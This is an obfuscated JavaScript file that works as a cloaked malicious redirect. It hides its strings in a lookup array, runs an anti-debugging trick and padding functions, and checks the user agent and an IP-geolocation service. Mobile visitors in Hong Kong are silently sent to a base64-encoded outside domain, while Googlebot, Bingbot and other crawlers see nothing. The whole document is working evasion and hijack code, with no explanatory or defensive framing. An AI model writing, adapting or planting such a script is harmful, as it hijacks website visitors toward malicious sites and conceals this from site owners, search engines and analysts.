(function () {
  const _0x3e3a = [
    "https://ipapi.co/json",
    "country",
    "HK",
    "location",
    "href",
    "aHR0cHM6Ly9kcmVhbWg1LmNvbQ==",
    "userAgent",
    "toLowerCase",
    "iphone",
    "android",
    "ipad",
    "googlebot",
    "bingbot",
    "slurp",
    "duckduckbot",
    "substring",
    "reverse",
    "split",
    "join",
    "random",
    "toString",
    "36",
    "SHA-256",
    "encode",
    "digest",
    "subtle",
    "crypto",
    "log",
    "byteLength"
  ];

  const _0x12a9 = (_i) => _0x3e3a[_i];

  const _antiDebug = () => {
    const _d = Function("return (function() {}.constructor('debugger')())");
    try {
      _d();
    } catch (e) {}
  };

  const _delay = (_t) =>
    new Promise((_r) => setTimeout(_r, _t + ~~(Math.random() * 500)));

  const _genHash = async (_salt) => {
    const _enc = new TextEncoder()[_0x12a9(24)](
      [...Array(10)]
        .map(() => Math.random().toString(36) )
        .join("") + _salt
    );
    const _hash = await window[_0x12a9(26)][_0x12a9(25)][_0x12a9(23)](_0x12a9(22), _enc);
    for (let i = 0; i < new Uint8Array(_hash).length; i += 5) {
      Math[_0x12a9(27)](i) + _hash[_0x12a9(28)];
    }
  };

  const _isHKMobile = async () => {
    try {
      const _ua = navigator[_0x12a9(6)][_0x12a9(7)]();
      const isMobile =
        _ua.includes(_0x12a9(8)) ||
        _ua.includes(_0x12a9(9)) ||
        _ua.includes(_0x12a9(10));
      const isBot =
        _ua.includes(_0x12a9(11)) ||
        _ua.includes(_0x12a9(12)) ||
        _ua.includes(_0x12a9(13)) ||
        _ua.includes(_0x12a9(14));
      const res = await fetch(_0x12a9(0));
      const json = await res.json();
      const isHK = json[_0x12a9(1)] === _0x12a9(2);
      return isMobile && !isBot && isHK;
    } catch (_) {
      return false;
    }
  };

  const _goto = async () => {
    if (!(await _isHKMobile())) return;
    await _genHash(Date.now());
    await _delay(5000);
    location[_0x12a9(4)] = atob(_0x12a9(5));
  };

  function _noise1() {
    return [Math.random(), Date.now(), navigator.language].join("x");
  }

  function _noise2() {
    if (window.innerWidth % 2 === 0) {
      return new Date().toISOString();
    } else {
      return _noise1();
    }
  }

  (function () {
    _antiDebug();
    _noise2();
    _goto();
  })();
})();
